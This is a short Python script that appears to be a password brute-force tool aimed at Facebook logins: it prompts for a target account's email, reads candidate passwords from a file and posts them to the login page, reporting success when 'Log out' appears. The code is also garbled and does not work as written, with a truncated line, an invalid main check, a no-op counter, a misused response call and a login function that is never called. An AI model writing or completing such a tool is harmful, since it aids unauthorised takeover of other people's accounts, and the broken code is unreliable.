import requests
import sys
ID_USERNAME = "email"
ID_PASSWORD = "pass"
FB_URL = 'http://facebook.com/login.php'

def try_password():
	payload = {ID_USERNAME : email, ID_PASSWORD : passwor>
	resp = requests.get(FB_URL)
	resp = requests.post(FB_URL, payload)
	r=resp.read()
	if 'Log out' in r:
		print("password is found")

PASSWORD_FILE="passwords.txt"
password= open(PASSWORD_FILE, 'r')
print("Password file selected: ", PASSWORD_FILE)
email = input('Target account Email/Number: ').strip()

if __name__="main":
	i=0
	while password:
		password=password.readline().strip()
		i+1
		print(str(i),password)
		
		
